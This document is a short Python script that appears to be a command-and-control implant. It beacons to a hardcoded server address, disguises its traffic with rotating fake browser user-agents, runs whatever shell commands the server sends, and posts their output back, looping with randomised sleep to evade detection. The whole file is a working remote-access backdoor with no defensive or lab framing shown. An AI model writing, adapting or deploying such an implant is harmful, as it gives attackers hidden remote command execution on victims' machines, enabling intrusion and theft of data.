import time
import uuid
import random
import requests
import subprocess

# Configuration
SERVER_URL = "http://10.109.164.207:5000"
BEACON_ENDPOINT = "/beacon"
RESULT_ENDPOINT = "/result"
SLEEP_MIN = 10     # Minimum sleep in seconds
SLEEP_MAX = 30     # Maximum sleep in seconds

# Generate a unique ID for this agent
AGENT_ID = str(uuid.uuid4())

# Fake user-agents to blend into normal traffic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
]

def beacon():
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    payload = {"id": AGENT_ID}
    try:
        response = requests.post(SERVER_URL + BEACON_ENDPOINT, json=payload, headers=headers)
        if response.status_code == 200:
            data = response.json()
            task = data.get("task")
            if task:
                execute_task(task)
    except Exception as e:
        print(f"[!] Beacon error: {e}")

def execute_task(task):
    try:
        print(f"[+] Executing task: {task}")
        result = subprocess.check_output(task, shell=True, stderr=subprocess.STDOUT)
        post_result(result.decode())
    except subprocess.CalledProcessError as e:
        post_result(e.output.decode())

def post_result(result):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    payload = {"id": AGENT_ID, "output": result}
    try:
        requests.post(SERVER_URL + RESULT_ENDPOINT, json=payload, headers=headers)
    except Exception as e:
        print(f"[!] Result posting error: {e}")

def main():
    while True:
        beacon()
        sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
